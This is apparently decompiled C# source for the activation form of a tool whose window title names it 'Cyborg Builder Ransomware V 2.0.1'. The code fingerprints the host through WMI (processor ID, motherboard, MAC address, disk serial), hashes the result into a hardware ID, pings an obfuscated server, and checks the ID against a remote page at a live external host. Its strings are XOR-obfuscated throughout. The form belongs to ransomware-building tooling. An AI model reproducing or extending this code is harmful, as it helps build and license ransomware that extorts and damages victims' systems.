using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace builder;

[DesignerGenerated]
public class Form2 : Form
{
	public class clsComputerInfo
	{
		[DebuggerNonUserCode]
		public clsComputerInfo()
		{
			Class14.hYiyYvszsKHjE();
			base._002Ector();
		}

		internal string method_0()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Expected O, but got Unknown
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected O, but got Unknown
			string result = string.Empty;
			SelectQuery val = new SelectQuery("Win32_processor");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item("processorId").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}

		internal string method_1()
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Expected O, but got Unknown
			ManagementClass val = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection instances = val.GetInstances();
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text.Equals(string.Empty))
					{
						if (Conversions.ToBoolean(((ManagementBaseObject)val2).get_Item("IPEnabled")))
						{
							text = ((ManagementBaseObject)val2).get_Item("MacAddress").ToString();
						}
						val2.Dispose();
					}
					text = text.Replace(":", string.Empty);
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}

		internal string method_2(string string_0 = "C")
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			ManagementObject val = new ManagementObject($"win32_logicaldisk.deviceid=\"{string_0}:\"");
			val.Get();
			return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		}

		internal string method_3()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Expected O, but got Unknown
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected O, but got Unknown
			string result = string.Empty;
			SelectQuery val = new SelectQuery("Win32_BaseBoard");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item("product").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}

		internal string method_4(string string_0)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(string_0);
			bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
			string text = "";
			byte[] array = bytes;
			foreach (byte b in array)
			{
				text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet((object)b, (Type)null, "ToString", new object[1] { RuntimeHelpers.GetObjectValue(method_5("6|", Conversions.ToString(method_6("+\a\b&\u0004\u000437\u00060\n\u0015#,<)0\u0016\u0001&\u000e+7", "evSJXbFRLBTwALliluwIogl")))) }, (string[])null, (Type[])null, (bool[])null)));
			}
			return text;
		}

		private object method_5(string string_0, string string_1)
		{
			string text = "";
			int num = Strings.Asc(string_1);
			checked
			{
				short num2 = (short)Strings.Len(string_0);
				short num3 = 1;
				while (true)
				{
					short num4 = num3;
					short num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
					num3 = (short)unchecked(num3 + 1);
				}
				return text;
			}
		}

		private object method_6(string string_0, string string_1)
		{
			string text = "";
			int num = Strings.Asc(string_1);
			checked
			{
				short num2 = (short)Strings.Len(string_0);
				short num3 = 1;
				while (true)
				{
					short num4 = num3;
					short num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
					num3 = (short)unchecked(num3 + 1);
				}
				return text;
			}
		}
	}

	private static List<WeakReference> list_0;

	private IContainer icontainer_0;

	[AccessedThroughProperty("BlackShadesNetForm1")]
	private BlackShadesNetForm _BlackShadesNetForm1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox _PictureBox3;

	[AccessedThroughProperty("تأثيرالماء1")]
	private GClass0 gclass0_0;

	[AccessedThroughProperty("Button5")]
	private Button _Button5;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	internal virtual BlackShadesNetForm BlackShadesNetForm1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlackShadesNetForm1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_BlackShadesNetForm1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox3 = value;
		}
	}

	internal virtual GClass0 GClass0_0
	{
		[DebuggerNonUserCode]
		get
		{
			return gclass0_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			gclass0_0 = value;
		}
	}

	internal virtual Button Button5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button5_Click;
			if (_Button5 != null)
			{
				((Control)_Button5).remove_Click(eventHandler);
			}
			_Button5 = value;
			if (_Button5 != null)
			{
				((Control)_Button5).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	[DebuggerNonUserCode]
	static Form2()
	{
		Class14.hYiyYvszsKHjE();
		list_0 = new List<WeakReference>();
	}

	[DebuggerNonUserCode]
	public Form2()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		Class14.hYiyYvszsKHjE();
		((Form)this)._002Ector();
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form2_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_022c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_02e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ed: Expected O, but got Unknown
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		//IL_045d: Expected O, but got Unknown
		//IL_04c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d3: Expected O, but got Unknown
		//IL_06aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b4: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		vmethod_1(new Timer(icontainer_0));
		BlackShadesNetForm1 = new BlackShadesNetForm();
		Button5 = new Button();
		TextBox1 = new TextBox();
		Panel1 = new Panel();
		GClass0_0 = new GClass0();
		PictureBox3 = new PictureBox();
		Label2 = new Label();
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		((Control)BlackShadesNetForm1).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)GClass0_0).SuspendLayout();
		((ISupportInitialize)PictureBox3).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		vmethod_0().set_Enabled(true);
		((Control)BlackShadesNetForm1).set_BackColor(Color.DodgerBlue);
		BlackShadesNetForm1.CloseButtonExitsApp = false;
		((Control)BlackShadesNetForm1).get_Controls().Add((Control)(object)Button5);
		((Control)BlackShadesNetForm1).get_Controls().Add((Control)(object)TextBox1);
		((Control)BlackShadesNetForm1).get_Controls().Add((Control)(object)Panel1);
		((Control)BlackShadesNetForm1).set_Dock((DockStyle)5);
		((Control)BlackShadesNetForm1).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)1));
		((Control)BlackShadesNetForm1).set_ForeColor(Color.FromArgb(142, 152, 156));
		BlackShadesNetForm blackShadesNetForm = BlackShadesNetForm1;
		Point location = new Point(0, 0);
		((Control)blackShadesNetForm).set_Location(location);
		BlackShadesNetForm1.MinimizeButton = true;
		((Control)BlackShadesNetForm1).set_Name("BlackShadesNetForm1");
		BlackShadesNetForm blackShadesNetForm2 = BlackShadesNetForm1;
		Size size = new Size(362, 228);
		((Control)blackShadesNetForm2).set_Size(size);
		((Control)BlackShadesNetForm1).set_TabIndex(0);
		((Control)BlackShadesNetForm1).set_Text(" Cyborg Builder Ransomware V 2.0.1   Acitvation");
		((Control)Button5).set_Anchor((AnchorStyles)6);
		((ButtonBase)Button5).set_BackColor(Color.Black);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Font(new Font("Arial Black", 12f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Button5).set_ForeColor(Color.Black);
		((ButtonBase)Button5).set_Image((Image)componentResourceManager.GetObject("Button5.Image"));
		Button button = Button5;
		location = new Point(282, 198);
		((Control)button).set_Location(location);
		((Control)Button5).set_Name("Button5");
		Button button2 = Button5;
		size = new Size(80, 30);
		((Control)button2).set_Size(size);
		((Control)Button5).set_TabIndex(60);
		((ButtonBase)Button5).set_UseVisualStyleBackColor(false);
		((TextBoxBase)TextBox1).set_BackColor(Color.Black);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)0);
		((Control)TextBox1).set_Font(new Font("Trebuchet MS", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(Color.Lime);
		TextBox textBox = TextBox1;
		location = new Point(0, 198);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox textBox2 = TextBox1;
		size = new Size(286, 30);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(57);
		((Control)Panel1).set_BackColor(Color.Black);
		((Control)Panel1).get_Controls().Add((Control)(object)GClass0_0);
		((Control)Panel1).get_Controls().Add((Control)(object)Label1);
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		Panel panel = Panel1;
		location = new Point(0, 21);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(371, 178);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(3);
		((Control)GClass0_0).set_BackColor(Color.Transparent);
		((Control)GClass0_0).get_Controls().Add((Control)(object)PictureBox3);
		((Control)GClass0_0).get_Controls().Add((Control)(object)Label2);
		GClass0_0.ImageBitmap = (Bitmap)componentResourceManager.GetObject("تأثيرالماء1.ImageBitmap");
		GClass0 gClass0_ = GClass0_0;
		location = new Point(0, 3);
		((Control)gClass0_).set_Location(location);
		((Control)GClass0_0).set_Name("تأثيرالماء1");
		GClass0_0.Scale = 1;
		GClass0 gClass0_2 = GClass0_0;
		size = new Size(362, 175);
		((Control)gClass0_2).set_Size(size);
		((Control)GClass0_0).set_TabIndex(57);
		PictureBox3.set_Image((Image)componentResourceManager.GetObject("PictureBox3.Image"));
		PictureBox pictureBox = PictureBox3;
		location = new Point(134, 87);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox3).set_Name("PictureBox3");
		PictureBox pictureBox2 = PictureBox3;
		size = new Size(53, 37);
		((Control)pictureBox2).set_Size(size);
		PictureBox3.set_SizeMode((PictureBoxSizeMode)4);
		PictureBox3.set_TabIndex(65);
		PictureBox3.set_TabStop(false);
		Label2.set_AutoSize(true);
		Label label = Label2;
		location = new Point(3, 155);
		((Control)label).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label2 = Label2;
		size = new Size(0, 16);
		((Control)label2).set_Size(size);
		((Control)Label2).set_TabIndex(62);
		Label1.set_AutoSize(true);
		Label label3 = Label1;
		location = new Point(3, 158);
		((Control)label3).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label4 = Label1;
		size = new Size(0, 16);
		((Control)label4).set_Size(size);
		((Control)Label1).set_TabIndex(56);
		PictureBox pictureBox3 = PictureBox1;
		location = new Point(0, 0);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox4 = PictureBox1;
		size = new Size(368, 178);
		((Control)pictureBox4).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(2);
		PictureBox1.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(362, 228);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)BlackShadesNetForm1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(" Cyborg Builder Ransomware V 2.0.1   Acitvation");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)BlackShadesNetForm1).ResumeLayout(false);
		((Control)BlackShadesNetForm1).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)GClass0_0).ResumeLayout(false);
		((Control)GClass0_0).PerformLayout();
		((ISupportInitialize)PictureBox3).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Timer WithEventsValue)
	{
		timer_0 = WithEventsValue;
	}

	private void Form2_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_9(), (AudioPlayMode)2);
		clsComputerInfo clsComputerInfo = new clsComputerInfo();
		string text = clsComputerInfo.method_2(Conversions.ToString(method_0("\u000f", Conversions.ToString(method_1(" &\b\u001e\u001d\u0003\v$\u0006<6'\u000e\u0001?\u0018\u001c\"&\u001a\u001f\0>", "lBGkqDQdMblfdbcsGYQjiat")))));
		string text2 = clsComputerInfo.method_3();
		string text3 = clsComputerInfo.method_1();
		_ = text + text2 + text3;
		string text4 = Strings.UCase(clsComputerInfo.method_4(text + text2 + text3));
		TextBox1.set_Text(text4);
		try
		{
			NewLateBinding.LateCall((object)((ServerComputer)Class2.Class1_0).get_Network(), (Type)null, "Ping", new object[1] { RuntimeHelpers.GetObjectValue(method_0("\u0013\u0013\u0013J\u0003\v\v\u0003\b\u0001J\a\v\t", Conversions.ToString(method_1("#5*\u0017\u0002)(\u000e.\f\u0017.%\u0001$4$\r!\u000f\u0004.\u0003", "GjPHECZeLWbGdrmsqUltoXf")))) }, (string[])null, (Type[])null, (bool[])null, true);
			((Control)Label2).set_ForeColor(Color.Lime);
			Label2.set_Text("Connected To Server!");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Control)Label2).set_ForeColor(Color.Red);
			Label2.set_Text("Server Not Found!");
			ProjectData.ClearProjectError();
		}
	}

	private object method_0(string string_0, string string_1)
	{
		string text = "";
		int num = Strings.Asc(string_1);
		checked
		{
			short num2 = (short)Strings.Len(string_0);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}

	private object method_1(string string_0, string string_1)
	{
		string text = "";
		int num = Strings.Asc(string_1);
		checked
		{
			short num2 = (short)Strings.Len(string_0);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}

	private void Button5_Click(object sender, EventArgs e)
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		try
		{
			string text = webClient.DownloadString("http://1177.rigala.net/t1-topic#1");
			if (text.Contains(TextBox1.get_Text()))
			{
				Interaction.MsgBox(RuntimeHelpers.GetObjectValue(method_2("\a02<&!0'01u\u0006 660&&3 99,", Conversions.ToString(method_3("0\u0001=\b\u00131\044\"\r)\u0011\r\u000f&&\u0002\u000f<\u0014\u00022", "eRHVpVmbDDMYEcdMTWqerHX")))), (MsgBoxStyle)64, RuntimeHelpers.GetObjectValue(method_2("\u00146!<#4!:'", Conversions.ToString(method_3("0\u0001=\b\u00131\044\"\r)\u0011\r\u000f&&\u0002\u000f<\u0014\u00022", "eRHVpVmbDDMYEcdMTWqerHX")))));
				((Computer)Class2.Class1_0).get_Audio().Stop();
				((Control)Class2.Class3_0.Form3).Show();
				((Control)this).Hide();
			}
			else
			{
				Interaction.MsgBox(RuntimeHelpers.GetObjectValue(method_2("uuuu\u001b:!u\a02<&!0'01", Conversions.ToString(method_3("0\u0001=\b\u00131\044\"\r)\u0011\r\u000f&&\u0002\u000f<\u0014\u00022", "eRHVpVmbDDMYEcdMTWqerHX")))), (MsgBoxStyle)16, RuntimeHelpers.GetObjectValue(method_2("\u00146!<#4!:'", Conversions.ToString(method_3("0\u0001=\b\u00131\044\"\r)\u0011\r\u000f&&\u0002\u000f<\u0014\u00022", "eRHVpVmbDDMYEcdMTWqerHX")))));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox(RuntimeHelpers.GetObjectValue(method_2("L\"\u0003\u0018L>\t\v\u0005\u001f\u0018\t\u001e\t\b", Conversions.ToString(method_3("\u001a9\u0011<<\"\u0018$&4!\u001c\u00027\u00025\u001b\u0015?\u001f\u0001\u0015>", "vCQqDUvcCvCwEsnLGSOnADJ")))), (MsgBoxStyle)16, RuntimeHelpers.GetObjectValue(method_2("\u00146!<#4!:'", Conversions.ToString(method_3("0\u0001=\b\u00131\044\"\r)\u0011\r\u000f&&\u0002\u000f<\u0014\u00022", "eRHVpVmbDDMYEcdMTWqerHX")))));
			ProjectData.ClearProjectError();
		}
	}

	private object method_2(string string_0, string string_1)
	{
		string text = "";
		int num = Strings.Asc(string_1);
		checked
		{
			short num2 = (short)Strings.Len(string_0);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}

	private object method_3(string string_0, string string_1)
	{
		string text = "";
		int num = Strings.Asc(string_1);
		checked
		{
			short num2 = (short)Strings.Len(string_0);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(string_0, unchecked((int)num3), 1))));
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}

	private void method_4(object sender, EventArgs e)
	{
	}

	private void method_5(object sender, EventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_6(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}
}
